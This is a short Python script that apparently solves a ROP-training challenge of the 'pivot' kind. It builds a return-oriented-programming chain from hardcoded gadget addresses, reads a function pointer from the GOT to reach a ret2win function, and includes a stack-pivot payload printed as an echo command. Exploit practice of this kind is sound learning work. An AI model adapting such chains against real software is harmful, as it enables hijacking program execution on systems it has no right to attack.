#!/usr/bin/python3

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, 8)
PACKS = lambda s: bytes(s + (((len(s) & ~7) + 8) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

POP_RBP_RET = 0x400829

POP_RAX = 0x4009bb
XCHG = 0x4009bd
DEREF_RAX = 0x4009c0
ADD_RAX_RBP = 0x4009c4

CALL_RAX = 0x4006b0

FOOTHOLD_PLT = 0x400720
FOOTHOLD_GOT = 0x601040

RET2WIN = 0xa81
FOOTHOLD = 0x96a

OFFSET = RET2WIN - FOOTHOLD

rop = b""

from sys import argv

if len(argv) > 1 and argv[1] == "ROP":
    rop += PACKP(FOOTHOLD_PLT)
    rop += PACKP(POP_RAX)
    rop += PACKP(FOOTHOLD_GOT)
    rop += PACKP(DEREF_RAX)
    rop += PACKP(POP_RBP_RET) + PACKP(OFFSET)
    rop += PACKP(ADD_RAX_RBP)
    rop += PACKP(CALL_RAX)
else:
    rop += b" " * 40
    rop += PACKP(POP_RAX) + PACKP(0x7fa245e1df10) + PACKP(XCHG)

echo(rop)
